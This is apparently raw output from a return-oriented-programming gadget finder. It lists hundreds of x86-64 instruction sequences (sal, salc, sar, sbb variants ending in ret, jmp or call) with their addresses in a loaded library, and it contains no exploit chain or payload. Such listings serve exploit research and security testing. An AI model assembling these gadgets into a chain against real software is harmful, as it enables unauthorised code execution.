0x00002aaaaab8012e : sal byte ptr [rdi + 0x48], 0x89 ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x00002aaaaab42d96 : sal byte ptr [rdi + rcx + 0x48], 0x8b ; mov edi, 0xe0 ; jmp rax
0x00002aaaaabf833e : sal byte ptr [rdi + rcx*2 + 0x41], 0x38 ; ret 0x5a74
0x00002aaaaac6a4c8 : sal byte ptr [rdi - 4], 0xff ; xor byte ptr [rdi - 4], dh ; call rax
0x00002aaaaac6a488 : sal byte ptr [rdi - 4], 1 ; inc dword ptr [rax + 0x77] ; cld ; call rax
0x00002aaaaab1ace4 : sal byte ptr [rdi], 1 ; add byte ptr [rax + rcx*2 - 0x75], ah ; add byte ptr [rax - 0x77], cl ; ret 0xde8
0x00002aaaaab5fe1b : sal byte ptr [rdx + 0x48], cl ; bsf eax, edx ; ret
0x00002aaaaabf7893 : sal byte ptr [rdx + rbp*2 + 0x48], 0x39 ; ret 0x5576
0x00002aaaaab756e3 : sal byte ptr [rdx + rdi - 0xa], cl ; ret 0x7501
0x00002aaaaab5deb3 : sal byte ptr [rdx + rdx + 0x48], 0xff ; ret 0x2288
0x00002aaaaab735fb : sal byte ptr [rdx + rdx*8 + 0xf], 0xbd ; ror byte ptr [rax + 1], 0xf8 ; ret
0x00002aaaaab3ad57 : sal byte ptr [rdx + rsi*4 - 0x15], cl ; xchg eax, ecx ; mov rdi, r15 ; call 0x71fda
0x00002aaaaac43cbf : sal byte ptr [rdx - 0x10f0992e], cl ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac43de0 : sal byte ptr [rdx - 0x10f09930], 1 ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x3a73
0x00002aaaaabe8ddc : sal byte ptr [rdx - 0xf], 1 ; xor eax, eax ; ret
0x00002aaaaac69a48 : sal byte ptr [rdx], 1 ; cld ; call rax
0x00002aaaaac12187 : sal byte ptr [rsi + rax + 0x31], 0xc0 ; ret
0x00002aaaaac0723a : sal byte ptr [rsi + rax + 0x48], 0x8d ; jge 0x132258 ; call rax
0x00002aaaaac0d3ba : sal byte ptr [rsi + rax + 0x48], 0x8d ; jge 0x1383d8 ; call rax
0x00002aaaaac0dad3 : sal byte ptr [rsi + rax + 0x48], 0x8d ; jge 0x138af1 ; call rax
0x00002aaaaac0941e : sal byte ptr [rsi + rax + 0x48], 0x8d ; jnp 0x134494 ; call rax
0x00002aaaaac09e3e : sal byte ptr [rsi + rax + 0x48], 0x8d ; jnp 0x134ea4 ; call rax
0x00002aaaaabc5166 : sal byte ptr [rsi + rbp + 0x48], 0x83 ; call 0xffffffffc298497a
0x00002aaaaabe6fa1 : sal byte ptr [rsi + rdx*8 + 0x49], 0x8b ; and al, 0x38 ; jmp 0x111f77
0x00002aaaaab6b7a2 : sal byte ptr [rsp + rax + 0x3c], 0x3d ; jne 0x967e2 ; mov rax, rdi ; pop rbx ; ret
0x00002aaaaab5f971 : sal byte ptr [rsp + rcx + 0x5b], 0x5d ; pop r12 ; ret
0x00002aaaaabf6da0 : sal byte ptr [rsp + rcx - 0xa], cl ; ret 0xc602
0x00002aaaaabdd1f2 : sal byte ptr [rsp + rdx + 0x48], 0x89 ; ret
0x00002aaaaac6993c : sal dh, 0xfb ; call qword ptr [rax]
0x00002aaaaabe773b : sal dh, 1 ; sbb al, 0x20 ; je 0x1127a9 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac69930 : sal dl, 1 ; sti ; jmp qword ptr [rax]
0x00002aaaaab805b3 : sal dword ptr [rbp + 0xa], 0x48 ; cmp edx, eax ; jne 0xab5ab ; xor eax, eax ; ret
0x00002aaaaab09e0a : sal dword ptr [rbp + 0xb], 0x48 ; add esp, 0x28 ; ret
0x00002aaaaab09acf : sal dword ptr [rbp + 0xe], 0x48 ; add esp, 0x28 ; ret
0x00002aaaaab1d76f : sal dword ptr [rbp + rsi*2 + 0x4c], -0x77 ; ret 0xf749
0x00002aaaaabd36d3 : sal dword ptr [rbp - 0x19], 1 ; mov r8, rdi ; mov byte ptr [r8 - 1], 0 ; ret
0x00002aaaaac102d4 : sal dword ptr [rbx + 9], 1 ; xor eax, eax ; ret
0x00002aaaaab80a52 : sal dword ptr [rbx + rdx + 0x48], -0x7d ; ret 0x8b04
0x00002aaaaac101bb : sal dword ptr [rcx], -0x40 ; cmp rdx, rcx ; je 0x13b1d9 ; ret
0x00002aaaaab73197 : sal dword ptr [rcx], -0x40 ; mov qword ptr [rdx], rcx ; ret
0x00002aaaaabf8235 : sal dword ptr [rcx], -0x40 ; rep stosq qword ptr [rdi], rax ; mov eax, r8d ; ret
0x00002aaaaab50a08 : sal dword ptr [rcx], 1 ; ror byte ptr [rax - 0x75], cl ; jmp rax
0x00002aaaaabd7f1a : sal dword ptr [rcx], cl ; sar byte ptr [rsi + 1], cl ; mov rdi, rbp ; call rbx
0x00002aaaaac6960c : sal dword ptr [rdi - 0x27d70003], 1 ; sti ; push rax ; fsincos ; call rax
0x00002aaaaac694d8 : sal dword ptr [rdi - 0x482e0003], 1 ; std ; call qword ptr [rcx - 0x2e00024b]
0x00002aaaaac694d4 : sal dword ptr [rdi - 0x482e0003], 1 ; std ; call rcx
0x00002aaaaac69558 : sal dword ptr [rdi - 0x482e0003], 1 ; std ; call rsi
0x00002aaaaac69588 : sal dword ptr [rdi - 0x482e0003], 1 ; std ; inc dword ptr [rdi - 0x49] ; std ; call rcx
0x00002aaaaac695f8 : sal dword ptr [rdi - 0x482e0003], 1 ; std ; jmp qword ptr [rax - 0x2e00024a]
0x00002aaaaac695d8 : sal dword ptr [rdi - 0x482e0003], 1 ; std ; jmp qword ptr [rax - 0x2e00024b]
0x00002aaaaac695e8 : sal dword ptr [rdi - 0x482e0003], 1 ; std ; jmp qword ptr [rax]
0x00002aaaaac69548 : sal dword ptr [rdi - 0x482e0003], 1 ; std ; lcall ptr [rsi - 0x49] ; std ; call rcx
0x00002aaaaac695c8 : sal dword ptr [rdi - 0x482e0003], 1 ; std ; push qword ptr [rax] ; mov bh, 0xfd ; call rcx
0x00002aaaaac69528 : sal dword ptr [rdi - 0x482e0003], 1 ; std ; push qword ptr [rcx - 0x4a] ; std ; call rcx
0x00002aaaaac69518 : sal dword ptr [rdi - 0x482e0003], 1 ; std ; push rcx ; mov ch, 0xfd ; call rcx
0x00002aaaaac69538 : sal dword ptr [rdi - 0x482e0003], 1 ; std ; push rcx ; mov dh, 0xfd ; call rcx
0x00002aaaaac6954c : sal dword ptr [rdi - 0x48a10003], 1 ; std ; call rcx
0x00002aaaaac6958c : sal dword ptr [rdi - 0x48b80003], 1 ; std ; call rcx
0x00002aaaaac695cc : sal dword ptr [rdi - 0x48cf0003], 1 ; std ; call rcx
0x00002aaaaac6953c : sal dword ptr [rdi - 0x490e0003], 1 ; std ; call rcx
0x00002aaaaac6957c : sal dword ptr [rdi - 0x49290003], 1 ; std ; call rcx
0x00002aaaaac695bc : sal dword ptr [rdi - 0x49440003], 1 ; std ; call rcx
0x00002aaaaac695fc : sal dword ptr [rdi - 0x495f0003], 1 ; std ; call rcx
0x00002aaaaac6952c : sal dword ptr [rdi - 0x498e0003], 1 ; std ; call rcx
0x00002aaaaac6956c : sal dword ptr [rdi - 0x49a90003], 1 ; std ; call rcx
0x00002aaaaac695ac : sal dword ptr [rdi - 0x49c40003], 1 ; std ; call rcx
0x00002aaaaac695ec : sal dword ptr [rdi - 0x49df0003], 1 ; std ; call rcx
0x00002aaaaac6951c : sal dword ptr [rdi - 0x4a0e0003], 1 ; std ; call rcx
0x00002aaaaac6955c : sal dword ptr [rdi - 0x4a290003], 1 ; std ; call rcx
0x00002aaaaac6959c : sal dword ptr [rdi - 0x4a440003], 1 ; std ; call rcx
0x00002aaaaac695dc : sal dword ptr [rdi - 0x4a5f0003], 1 ; std ; call rcx
0x00002aaaaac694dc : sal dword ptr [rdi - 0x4a6e0003], 1 ; std ; call rcx
0x00002aaaaac694fc : sal dword ptr [rdi - 0x4a7f0003], 1 ; std ; call rcx
0x00002aaaaac694ec : sal dword ptr [rdi - 0x4a990003], 1 ; std ; call rcx
0x00002aaaaac6950c : sal dword ptr [rdi - 0x4aaa0003], 1 ; std ; call rcx
0x00002aaaaac43c1f : sal dword ptr [rdx - 0x10f0992d], cl ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac43d5f : sal dword ptr [rdx - 0x10f0992f], 1 ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab73029 : sal dword ptr [rsp + rsi*8 + 0x39], 1 ; int1 ; je 0x9e028 ; ret
0x00002aaaaac5bf69 : sal eax, -1 ; pop rax ; ret
0x00002aaaaac5d2dd : sal ebx, 1 ; dec ecx ; fcompi st(3) ; call qword ptr [rcx]
0x00002aaaaac22085 : sal ebx, 1 ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x00002aaaaac5d261 : sal ebx, cl ; call qword ptr [rcx]
0x00002aaaaac5d259 : sal ebx, cl ; dec ecx ; fcompi st(3) ; ljmp ptr [rdx - 0x2d] ; call qword ptr [rcx]
0x00002aaaaac6dcd1 : sal esi, -1 ; cld ; xchg eax, esi ; add dword ptr [rax], eax ; ret 0xfff6
0x00002aaaaac82a11 : sal esp, 1 ; jmp rcx
0x00002aaaaac44d56 : salc ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7510
0x00002aaaaac6e8dd : salc ; add dword ptr [rax], eax ; xchg eax, esp ; and al, 0xf8 ; jmp rsp
0x00002aaaaac071db : salc ; add rdi, 0x10 ; jmp rcx
0x00002aaaaac253c6 : salc ; add rdi, rdx ; add r9, r11 ; jmp r9
0x00002aaaaac48551 : salc ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabe7739 : salc ; call rax
0x00002aaaaab7ea3a : salc ; clc ; ret
0x00002aaaaac6fb51 : salc ; cli ; call rsp
0x00002aaaaabe5010 : salc ; cmovne eax, ecx ; ret
0x00002aaaaabf834f : salc ; ja 0x12333c ; mov eax, 0xffffffff ; ret
0x00002aaaaaad88ed : salc ; jb 0x396f ; cmpsq qword ptr [rsi], qword ptr [rdi] ; ret 0x49ec
0x00002aaaaab1d21e : salc ; jne 0x48215 ; xor eax, eax ; ret
0x00002aaaaac69560 : salc ; mov ch, 0xfd ; call rcx
0x00002aaaaac69580 : salc ; mov dh, 0xfd ; call rcx
0x00002aaaaab48020 : salc ; mov eax, 0xffffffff ; ja 0x73039 ; ret
0x00002aaaaaad6bf0 : salc ; mov ebp, dword ptr [rsi + rbx*8 + 0x6d] ; ret 0x1bb7
0x00002aaaaabe6fa3 : salc ; mov rax, qword ptr [r12 + 0x38] ; jmp 0x111f75
0x00002aaaaab80b89 : salc ; mov rax, rdi ; ret
0x00002aaaaabb56b1 : salc ; movsxd rdx, dword ptr [rcx + rdx*4] ; add rdx, rcx ; jmp rdx
0x00002aaaaab99721 : salc ; movsxd rsi, dword ptr [rax + rsi*4] ; add rax, rsi ; jmp rax
0x00002aaaaaad72e4 : salc ; ret
0x00002aaaaaad75e6 : salc ; ret 0x23cb
0x00002aaaaac15336 : salc ; sub byte ptr [rax], al ; call qword ptr [rax]
0x00002aaaaac02c6e : salc ; sub esi, eax ; mov eax, esi ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaac5c390 : sar ah, 1 ; int1 ; push rax ; cld ; int1 ; call qword ptr [rax]
0x00002aaaaac5c3e0 : sar bh, 0xf1 ; push rax ; push rcx ; jmp qword ptr [rax]
0x00002aaaaab3ec97 : sar bh, 1 ; jmp qword ptr [rsi + 0xf]
0x00002aaaaabadf6b : sar bh, 1 ; loopne 0xd8fe0 ; nop ; mov byte ptr [rdi + 8], 2 ; xor eax, eax ; ret
0x00002aaaaab36b8c : sar bl, 0xff ; dec dword ptr [rax + 0x39] ; ret 0x940f
0x00002aaaaab33be8 : sar bl, 0xff ; dec dword ptr [rax - 0x77] ; ret 0x348
0x00002aaaaabf5380 : sar bl, 0xff ; dec dword ptr [rax - 0x7d] ; ret
0x00002aaaaab3a88c : sar bl, 0xff ; inc dword ptr [rcx + 0x80e2] ; add dh, dh ; ret
0x00002aaaaab31b53 : sar bl, 0xff ; inc esi ; add al, 1 ; add dword ptr [rax - 0x7d], ecx ; ret 0xf01
0x00002aaaaac697c1 : sar bl, 1 ; inc eax ; sar ebx, 1 ; call qword ptr [rax]
0x00002aaaaabcad27 : sar byte ptr [rax + 0x1c], cl ; syscall ; neg eax ; ret
0x00002aaaaabf61e3 : sar byte ptr [rax + 0x5e], 0x89 ; ret
0x00002aaaaabf5e11 : sar byte ptr [rax + 0x64], 0x89 ; ret
0x00002aaaaab4d323 : sar byte ptr [rax + 0xa], 0x48 ; mov dword ptr [rbx + 0x90], eax ; pop rbx ; ret
0x00002aaaaabd0733 : sar byte ptr [rax + 0xa], 0x8b ; or byte ptr [rip + 0x100f], r12b ; ret
0x00002aaaaac150b2 : sar byte ptr [rax + 0xb], 0x48 ; add esp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabd0cf8 : sar byte ptr [rax + 0xd], cl ; add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabd0b56 : sar byte ptr [rax + 0xf], 0x8b ; and al, 0xc ; add rsp, 0x18 ; ret
0x00002aaaaaaff84b : sar byte ptr [rax + 1], 0xf ; ret 0x4389
0x00002aaaaaba201f : sar byte ptr [rax + 1], cl ; ret
0x00002aaaaab59c67 : sar byte ptr [rax + 6], 0xf3 ; ret
0x00002aaaaabd113a : sar byte ptr [rax + 7], 0xb8 ; adc al, 0 ; add byte ptr [rax], al ; sub eax, edx ; ret
0x00002aaaaab4aadc : sar byte ptr [rax + 9], 0xf3 ; ret
0x00002aaaaaafbec1 : sar byte ptr [rax + rax*4], 0xf ; xchg eax, esp ; ret 0x8348
0x00002aaaaabd130a : sar byte ptr [rax - 0x39], 0x48 ; mov eax, ebx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac6a2c4 : sar byte ptr [rax - 4], 0xff ; xor byte ptr [rax - 4], bh ; jmp qword ptr [rax + 0x16fffc77]
0x00002aaaaabd20a3 : sar byte ptr [rax], 0x48 ; cmove eax, ebx ; pop rbx ; ret
0x00002aaaaab6b8d4 : sar byte ptr [rax], 0x48 ; cmovne eax, edi ; ret
0x00002aaaaabd2073 : sar byte ptr [rcx + 3], 0xc6 ; add eax, dword ptr [rax] ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaabdb7f3 : sar byte ptr [rdi + rdi + 0x74], 1 ; ret
0x00002aaaaac87ad0 : sar byte ptr [rdi], 0xf6 ; call qword ptr [rax]
0x00002aaaaac85580 : sar byte ptr [rdx - 0xb], 1 ; jmp qword ptr [rcx]
0x00002aaaaabab71d : sar byte ptr [rdx], 0xe ; je 0xd66bc ; pop rbx ; ret
0x00002aaaaaad7b85 : sar byte ptr [rdx], cl ; adc al, 0xe7 ; ret
0x00002aaaaabd7f1c : sar byte ptr [rsi + 1], cl ; mov rdi, rbp ; call rbx
0x00002aaaaaba164c : sar byte ptr [rsi + 9], 1 ; ret
0x00002aaaaac5835f : sar byte ptr [rsi + rax*2], 0xf8 ; mov ch, 0x36 ; push rcx ; call qword ptr [rsi]
0x00002aaaaac6a2a4 : sar byte ptr [rsp + rdi*8 - 1], 1 ; push rax ; jl 0x1952ae ; call rax
0x00002aaaaac5c3b0 : sar ch, 1 ; int1 ; push rax ; std ; int1 ; jmp qword ptr [rax]
0x00002aaaaac6f2a1 : sar cl, 1 ; lcall ptr [rsp - 0x2efbfffe] ; stc ; call rsp
0x00002aaaaac69984 : sar cl, 1 ; sti ; jmp qword ptr [rax]
0x00002aaaaab40452 : sar dword ptr [rax + 0x10], -0x7b ; leave ; je 0x6b46b ; ret
0x00002aaaaabadc25 : sar dword ptr [rax + 1], 0x4c ; mov edx, eax ; jmp 0xd8c42
0x00002aaaaab73f33 : sar dword ptr [rax + rcx*2 + 0x11], 1 ; jns 0x9ef3e ; ret
0x00002aaaaab74686 : sar dword ptr [rax + rcx*2 + 0x11], 1 ; jns 0x9f691 ; ret
0x00002aaaaab74dd3 : sar dword ptr [rax + rcx*2 + 0x11], 1 ; jns 0x9fdde ; ret
0x00002aaaaabd2e9b : sar dword ptr [rax], 0xf ; xchg eax, esp ; ret 0xd108
0x00002aaaaabd8ad3 : sar dword ptr [rbp - 0x74b6000f], 1 ; cmp al, 0x24 ; call rbx
0x00002aaaaabbc246 : sar dword ptr [rcx], 1 ; ret
0x00002aaaaaaf4969 : sar dword ptr [rcx], 1 ; ret 0xffb8
0x00002aaaaaba7637 : sar dword ptr [rcx], cl ; ret 0xef7c
0x00002aaaaab16925 : sar dword ptr [rdx + 1], -0x77 ; ret
0x00002aaaaabd2e3f : sar dword ptr [rsp + rbx*2], 0xf ; xchg eax, esp ; ret 0xd108
0x00002aaaaab09f03 : sar eax, 0x10 ; ret
0x00002aaaaab9f129 : sar eax, 0x1f ; lea rsp, qword ptr [rbp - 0x10] ; pop rbx ; pop r12 ; pop rbp ; ret
0x00002aaaaab09b69 : sar eax, 0x1f ; not eax ; and eax, edx ; ret
0x00002aaaaac14a74 : sar eax, 0x1f ; ret
0x00002aaaaab09ebb : sar eax, 0x1f ; sub edx, ecx ; not eax ; and eax, edx ; ret
0x00002aaaaab0978d : sar eax, 0x3f ; not eax ; and eax, edx ; ret
0x00002aaaaaad8af5 : sar eax, 1 ; cmp eax, ecx ; mov bl, 0xf7 ; adc bh, byte ptr [rax] ; cwde ; ret
0x00002aaaaabd2a02 : sar eax, 1 ; dec dword ptr [rax - 0x73] ; adc cl, byte ptr [rax - 0x77] ; ret 0x8948
0x00002aaaaab47d6c : sar eax, 2 ; lea eax, dword ptr [r8 - 1] ; ret
0x00002aaaaab4a660 : sar eax, 2 ; mov qword ptr [rcx], rax ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab485a8 : sar eax, 2 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab484f9 : sar eax, 2 ; ret
0x00002aaaaabed4ad : sar eax, 6 ; ret
0x00002aaaaac697c5 : sar ebx, 1 ; call qword ptr [rax]
0x00002aaaaac6f2a9 : sar ecx, 1 ; call rsp
0x00002aaaaac580c3 : sar ecx, 1 ; jnp 0x183084 ; ret
0x00002aaaaab0f634 : sar edx, 0x1f ; xor eax, edx ; sub eax, edx ; ret
0x00002aaaaab0f647 : sar edx, 0x3f ; xor rax, rdx ; sub rax, rdx ; ret
0x00002aaaaab63137 : sar edx, cl ; movzx edx, dl ; sub eax, edx ; ret
0x00002aaaaab5fc48 : sar edx, cl ; test rdx, rdx ; je 0x8ac6a ; bsf rax, rdx ; ret
0x00002aaaaab5fc48 : sar edx, cl ; test rdx, rdx ; je 0x8ac6b ; bsf rax, rdx ; ret
0x00002aaaaab5fe17 : sar edx, cl ; test rdx, rdx ; je 0x8ae4a ; bsf rax, rdx ; ret
0x00002aaaaab5fe17 : sar edx, cl ; test rdx, rdx ; je 0x8ae4b ; bsf rax, rdx ; ret
0x00002aaaaab47d6b : sar r8, 2 ; lea eax, dword ptr [r8 - 1] ; ret
0x00002aaaaab0978c : sar rax, 0x3f ; not eax ; and eax, edx ; ret
0x00002aaaaab4a65f : sar rax, 2 ; mov qword ptr [rcx], rax ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab484f8 : sar rax, 2 ; ret
0x00002aaaaabed4ac : sar rax, 6 ; ret
0x00002aaaaab0f646 : sar rdx, 0x3f ; xor rax, rdx ; sub rax, rdx ; ret
0x00002aaaaab63136 : sar rdx, cl ; movzx edx, dl ; sub eax, edx ; ret
0x00002aaaaab5fc47 : sar rdx, cl ; test rdx, rdx ; je 0x8ac6b ; bsf rax, rdx ; ret
0x00002aaaaab5fe16 : sar rdx, cl ; test rdx, rdx ; je 0x8ae4b ; bsf rax, rdx ; ret
0x00002aaaaac69ae9 : sbb ah, bh ; call qword ptr [rax - 0x1f0003e7]
0x00002aaaaac6d1b9 : sbb ah, dh ; dec dword ptr [rsp + rdx*2 + 0x20c40001] ; hlt ; call rsp
0x00002aaaaac81c48 : sbb al, 0 ; add byte ptr [rax], al ; adc al, 0x1d ; add dword ptr [rax], eax ; mov al, 0x66 ; stc ; call qword ptr [rax]
0x00002aaaaac7d780 : sbb al, 0 ; add byte ptr [rax], al ; fadd dword ptr [rax] ; add byte ptr [rax + 0x25], bh ; int1 ; jmp qword ptr [rcx]
0x00002aaaaac81120 : sbb al, 0 ; add byte ptr [rax], al ; in al, dx ; adc dword ptr [rcx], eax ; add al, bl ; fpatan ; call qword ptr [rbx]
0x00002aaaaac81be8 : sbb al, 0 ; add byte ptr [rax], al ; mov ah, 0x1c ; add dword ptr [rax], eax ; mov al, 0x87 ; hlt ; call qword ptr [rax]
0x00002aaaaac89c78 : sbb al, 0 ; add byte ptr [rax], al ; popfq ; add dword ptr [rax], eax ; adc bh, 0xf6 ; call qword ptr [rdi]
0x00002aaaaac81160 : sbb al, 0 ; add byte ptr [rax], al ; sub al, 0x12 ; add dword ptr [rax], eax ; fcomp st(1) ; call qword ptr [rsi]
0x00002aaaaabcad29 : sbb al, 0 ; add byte ptr [rax], al ; syscall ; neg eax ; ret
0x00002aaaaac7d868 : sbb al, 0 ; add byte ptr [rax], al ; xor al, 0xd9 ; add byte ptr [rax], al ; and dword ptr [rdi], ebp ; int1 ; jmp qword ptr [rax]
0x00002aaaaab4ccba : sbb al, 0 ; add byte ptr [rax], al ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac71c25 : sbb al, 0 ; add byte ptr [rax], bl ; cmp ch, cl ; call qword ptr [rsi]
0x00002aaaaac71bf5 : sbb al, 0 ; add byte ptr [rax], ch ; cmp ch, cl ; call qword ptr [rax]
0x00002aaaaabe773e : sbb al, 0x20 ; je 0x1127a6 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabe773d : sbb al, 0x20 ; je 0x1127a7 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac4826d : sbb al, 0x24 ; mov rdx, qword ptr [rdx + rbp*8] ; test rdx, rdx ; je 0x173285 ; call rdx
0x00002aaaaac82654 : sbb al, 0x27 ; add dword ptr [rax], eax ; js 0x1ad609 ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac0b2be : sbb al, 0x29 ; add byte ptr [rax - 0x7f], cl ; in al, dx ; add byte ptr [rax], 0 ; add al, ch ; ret
0x00002aaaaac5c718 : sbb al, 0x29 ; jmp rsp
0x00002aaaaac5c710 : sbb al, 0x29 ; lcall ptr [rsi] ; sub edx, esi ; lcall ptr [rcx + rbp] ; jmp rsp
0x00002aaaaac0b11d : sbb al, 0x41 ; call qword ptr [rdx]
0x00002aaaaaad7f9c : sbb al, 0x44 ; nop ; ret 0x5bdb
0x00002aaaaabe3b88 : sbb al, 0x45 ; cmp byte ptr [rax], cl ; je 0x10ebb4 ; mov rdx, r8 ; jmp 0x10eba4
0x00002aaaaab7ad69 : sbb al, 0x48 ; lea edi, dword ptr [rdi + 0x1c] ; jne 0xa628b ; ret
0x00002aaaaab7c4bd : sbb al, 0x48 ; lea edi, dword ptr [rdi + 0x1c] ; jne 0xa7a9b ; ret
0x00002aaaaac84e54 : sbb al, 0x4f ; add dword ptr [rax], eax ; cmp byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac85154 : sbb al, 0x52 ; add dword ptr [rax], eax ; sub byte ptr [rbx - 0xb], dh ; call qword ptr [rsi]
0x00002aaaaac42e70 : sbb al, 0x65 ; add al, byte ptr [rax] ; movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaac86f54 : sbb al, 0x70 ; add dword ptr [rax], eax ; clc ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaabd4163 : sbb al, 0x83 ; ret
0x00002aaaaab3e99b : sbb al, 0x83 ; ret 0x8308
0x00002aaaaab3dac8 : sbb al, 0x89 ; ret
0x00002aaaaaba9e03 : sbb al, 0xb8 ; add al, byte ptr [rax] ; add byte ptr [rax], al ; ret
0x00002aaaaaad5454 : sbb al, 0xc ; ret 0x4412
0x00002aaaaac7c154 : sbb al, 0xc2 ; add byte ptr [rax], al ; call 0x281a6b8d
0x00002aaaaac5be0c : sbb al, 0xdb ; out dx, eax ; jmp rsi
0x00002aaaaabb3095 : sbb al, 0xe9 ; adc eax, 0x1fffffe ; ret 0x8b49
0x00002aaaaac7d4e9 : sbb al, 0xf1 ; jmp qword ptr [rcx]
0x00002aaaaac83c69 : sbb al, 0xf5 ; call qword ptr [rdx]
0x00002aaaaac81c0d : sbb al, 1 ; add al, ah ; stc ; call qword ptr [rax]
0x00002aaaaac76ec5 : sbb al, byte ptr [rax] ; add byte ptr [rax], cl ; sbb ebp, ebp ; jmp qword ptr [rax]
0x00002aaaaabf8110 : sbb al, byte ptr [rbp - 0x78] ; add dword ptr [rcx - 0x7d], ecx ; ret 0x4c02
0x00002aaaaabe9312 : sbb al, byte ptr [rbx + rbp] ; test eax, eax ; jne 0x11432a ; xor eax, eax ; ret
0x00002aaaaab209a2 : sbb al, byte ptr [rbx - 0x4a743] ; call qword ptr [rax]
0x00002aaaaab3a9c9 : sbb al, byte ptr [rbx - 0x78f0d006] ; test eax, 0x83000000 ; ret 0x8308
0x00002aaaaab80b7c : sbb al, byte ptr [rcx - 0x75] ; add dword ptr [rcx + 0x39], eax ; ret
0x00002aaaaab2fa9a : sbb al, byte ptr [rcx - 0x7d] ; ret
0x00002aaaaabb85d1 : sbb al, ch ; leave ; ret 0xfff3
0x00002aaaaab4bca7 : sbb al, ch ; ret
0x00002aaaaab09ab4 : sbb al, dh ; adc eax, 0x540f6600 ; ret 0xf66
0x00002aaaaac803d8 : sbb al, dh ; call rcx
0x00002aaaaac69289 : sbb bh, bl ; call qword ptr [rax]
0x00002aaaaaba9dba : sbb bh, byte ptr [rax + 2] ; ret
0x00002aaaaac7afb9 : sbb bh, dl ; call qword ptr [rax]
0x00002aaaaac101f8 : sbb bl, al ; nop word ptr [rax + rax] ; xor eax, eax ; ret
0x00002aaaaac6927d : sbb bl, bh ; inc dword ptr [rax] ; sbb ebx, edi ; push rax ; sbb ebx, edi ; jmp rax
0x00002aaaaabe24ed : sbb bl, byte ptr [rbx + 0x31] ; rcr byte ptr [rbp + 0x41], 0x5c ; pop r13 ; pop r14 ; ret
0x00002aaaaac56e45 : sbb bl, byte ptr [rsi] ; ret
0x00002aaaaab521b6 : sbb byte ptr [r11 + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab4cc86 : sbb byte ptr [r15 + 0xe], r14b ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab08e51 : sbb byte ptr [r15], r9b ; scasd eax, dword ptr [rdi] ; ret 0xd231
0x00002aaaaab4bb8e : sbb byte ptr [r8 + 0x29], cl ; ret 0x8948
0x00002aaaaac179bf : sbb byte ptr [r8 + 0x5a], bl ; pop rbx ; ret
0x00002aaaaac10231 : sbb byte ptr [r8 + 1], r15b ; ret
0x00002aaaaabe76a7 : sbb byte ptr [r8 + 1], r9b ; ret 0x8948
0x00002aaaaab50160 : sbb byte ptr [r8 - 0x77], r9b ; push rdi ; mov qword ptr [rdi + 8], rax ; ret
0x00002aaaaab9dfe2 : sbb byte ptr [r8 - 0x7d], r9b ; ret
0x00002aaaaab509ae : sbb byte ptr [r8], al ; add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaac105d6 : sbb byte ptr [r8], al ; add byte ptr [rax], al ; add byte ptr [rbx - 0xd], bl ; ret
0x00002aaaaab39133 : sbb byte ptr [r8], al ; add dh, dh ; ret
0x00002aaaaab7e2b4 : sbb byte ptr [r8], r14b ; in eax, dx ; mov byte ptr [rdi + 0x19], ch ; ret
0x00002aaaaab7e2d6 : sbb byte ptr [r8], r14b ; in eax, dx ; mov byte ptr [rdi + 0x1a], ch ; ret
0x00002aaaaab7e314 : sbb byte ptr [r8], r14b ; in eax, dx ; mov byte ptr [rdi + 0x1c], ch ; ret
0x00002aaaaab56c50 : sbb byte ptr [r9 + 0x39], r9b ; ret 0x850f
0x00002aaaaab491da : sbb byte ptr [r9 - 0x77], r9b ; sub byte ptr [r8 + 1], r9b ; ret 0x8949
0x00002aaaaab4bb8f : sbb byte ptr [rax + 0x29], cl ; ret 0x8948
0x00002aaaaab53c13 : sbb byte ptr [rax + 0x39], cl ; ret
0x00002aaaaabaa7b6 : sbb byte ptr [rax + 0x39], cl ; ret 0x870f
0x00002aaaaac179c0 : sbb byte ptr [rax + 0x5a], bl ; pop rbx ; ret
0x00002aaaaab52397 : sbb byte ptr [rax + 0x5bd88948], dl ; pop rbp ; pop r12 ; ret
0x00002aaaaabebcd3 : sbb byte ptr [rax + 0xf], cl ; scasd eax, dword ptr [rdi] ; jmp 0x76d3a62b
0x00002aaaaac187a8 : sbb byte ptr [rax + 1], bh ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaac10232 : sbb byte ptr [rax + 1], bh ; ret
0x00002aaaaac11c3d : sbb byte ptr [rax + 1], cl ; ret
0x00002aaaaabe76a8 : sbb byte ptr [rax + 1], cl ; ret 0x8948
0x00002aaaaac092d7 : sbb byte ptr [rax + rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
